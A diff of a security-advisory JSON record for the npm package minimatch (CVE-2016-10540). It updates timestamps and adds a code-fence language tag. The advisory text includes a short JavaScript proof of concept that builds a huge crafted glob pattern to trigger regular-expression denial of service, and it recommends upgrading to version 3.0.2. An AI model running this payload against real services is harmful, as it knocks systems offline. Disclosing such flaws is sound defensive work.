@@ -1,6 +1,6 @@
 {
   "Severity": "HIGH",
-  "UpdatedAt": "2018-10-09T00:26:22Z",
+  "UpdatedAt": "2023-09-11T22:02:07Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "minimatch"
@@ -30,12 +30,12 @@
         "Value": "CVE-2016-10540"
       }
     ],
-    "Description": "Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.\n\n\n## Proof of Concept\n```\nvar minimatch = require(“minimatch”);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = “”;\n  for (i=0; i\u003c=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = “[!” + genstr(1000000, “\\\\”) + “A”;\n\n// minimatch exploit.\nconsole.log(“starting minimatch”);\nminimatch(“foo”, exploit);\nconsole.log(“finishing minimatch”);\n```\n\n\n## Recommendation\n\nUpdate to version 3.0.2 or later.",
+    "Description": "Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.\n\n\n## Proof of Concept\n```js\nvar minimatch = require(“minimatch”);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = “”;\n  for (i=0; i\u003c=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = “[!” + genstr(1000000, “\\\\”) + “A”;\n\n// minimatch exploit.\nconsole.log(“starting minimatch”);\nminimatch(“foo”, exploit);\nconsole.log(“finishing minimatch”);\n```\n\n\n## Recommendation\n\nUpdate to version 3.0.2 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-10-09T00:40:41Z",
     "Severity": "HIGH",
     "Summary": "Regular Expression Denial of Service in minimatch",
-    "UpdatedAt": "2023-01-09T05:03:09Z",
+    "UpdatedAt": "2023-09-11T22:02:07Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 7.5,
